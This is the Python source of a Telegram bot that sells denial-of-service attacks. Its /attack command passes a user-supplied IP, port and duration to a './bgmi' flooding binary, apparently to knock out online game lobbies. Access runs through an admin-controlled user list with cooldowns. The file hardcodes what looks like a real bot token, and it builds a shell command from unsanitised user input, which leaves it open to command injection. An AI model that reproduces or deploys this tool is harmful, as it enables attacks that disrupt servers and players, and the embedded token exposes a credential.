import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7926195584:AAH2hpbg79JlK7T1BDU_1Zi3k0tzpmo6Oao'
ADMIN_USER_ID = 7581889743
USERS_FILE = 'users.txt'
attack_tasks = {}
last_attack_time = {}


def load_users():
    try:
        with open(USERS_FILE) as f:
            return {
                line.split()[0]: (int(line.split()[1]), int(line.split()[2])) for line in f if line.strip()
            }
    except FileNotFoundError:
        return {}


def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user, (duration, cooldown) in users.items():
            f.write(f"{user} {duration} {cooldown}\n")

users = load_users()


async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🍁 𓆩 𝐓𝐇𝐄 𝐒𝐂𝐀𝐑𝐓𝐄𝐋 𝐂𝐨𝐧𝐬𝐨𝐥𝐞 𓆪 🍁*\n\n"
        "*🐰 𝐔𝐬𝐞: /attack <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>🐰*\n\n"
        "*🍁 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐅𝐔𝐂𝐊 𝐋𝐎𝐁𝐁𝐈𝐄𝐒 24x7 🍁*\n\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')


async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 900",  # Default threads set to 800
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*📵 𝐄𝐫𝐫𝐨𝐫 𝐝𝐮𝐫𝐢𝐧𝐠 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤: {str(e)}*", parse_mode='Markdown')
    finally:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝! ✅*\n*👍 𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐮𝐬𝐢𝐧𝐠 𝐎𝐮𝐫 🥀*\n*🍁 𝐓𝐇𝐄 𝐕𝐀𝐋𝐎𝐂𝐈𝐓𝐘 𝐒𝐞𝐫𝐯𝐢𝐜𝐞! 🍁*", parse_mode='Markdown')


async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*🔥 𝐈 𝐍𝐞𝐞𝐝 𝐚𝐝𝐦𝐢𝐧 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.🔥*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    duration = int(duration)
    max_duration, cooldown = users[user_id]
    current_time = time.time()

    
    if user_id in last_attack_time:
        time_since_last_attack = (current_time - last_attack_time[user_id]) / 60  # Convert to minutes
        if time_since_last_attack < cooldown:
            remaining_time = cooldown - time_since_last_attack
            await context.bot.send_message(chat_id=chat_id, text=f"*📵 𝐘𝐨𝐮 𝐦𝐮𝐬𝐭 𝐰𝐚𝐢𝐭 {remaining_time:.1f} 𝐦𝐢𝐧𝐮𝐭𝐞𝐬 𝐛𝐞𝐟𝐨𝐫𝐞 𝐚𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 𝐚𝐠𝐚𝐢𝐧.*", parse_mode='Markdown')
            return

    
    if duration > max_duration:
        await context.bot.send_message(chat_id=chat_id, text=f"*📵 𝐘𝐨𝐮 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐮𝐬𝐞 𝐚 𝐦𝐚𝐱𝐢𝐦𝐮𝐦 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐨𝐟 {max_duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.*", parse_mode='Markdown')
        return

    
    last_attack_time[user_id] = current_time
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*🍁 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐚𝐮𝐧𝐜𝐡𝐞𝐝!*\n"
        f"*🍁 𝐓𝐚𝐫𝐠𝐞𝐭: {ip}:{port}*\n"
        f"*🍁 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬*\n"
        f"*🍁 𝐄𝐧𝐣𝐨𝐲 𝐀𝐧𝐝 𝐅𝐮𝐜𝐤 𝐖𝐡𝐨𝐥𝐞 𝐋𝐨𝐛𝐛𝐲!*"
    ), parse_mode='Markdown')
    await run_attack(chat_id, ip, port, duration, context)


async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*📵 𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐚𝐝𝐦𝐢𝐧 𝐩𝐫𝐢𝐯𝐢𝐥𝐞𝐠𝐞𝐬 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.*", parse_mode='Markdown')
        return

    if len(args) not in [2, 3, 4]:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /manage <add|rem> <user_id> [duration] [cooldown]*", parse_mode='Markdown')
        return

    command, target_user_id = args[:2]
    duration = int(args[2]) if len(args) >= 3 else 9999
    cooldown = int(args[3]) if len(args) == 4 else 4

    if command == 'add':
        users[target_user_id] = (duration, cooldown)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐔𝐬𝐞𝐫 {target_user_id} 𝐚𝐝𝐝𝐞𝐝.*", parse_mode='Markdown')
    elif command == 'rem':
        if target_user_id in users:
            del users[target_user_id]
            save_users(users)
            await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐔𝐬𝐞𝐫 {target_user_id} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝.*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"*📵 𝐔𝐬𝐞𝐫 {target_user_id} 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.*", parse_mode='Markdown')


def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("manage", manage))
    application.run_polling()

if __name__ == '__main__':
    main()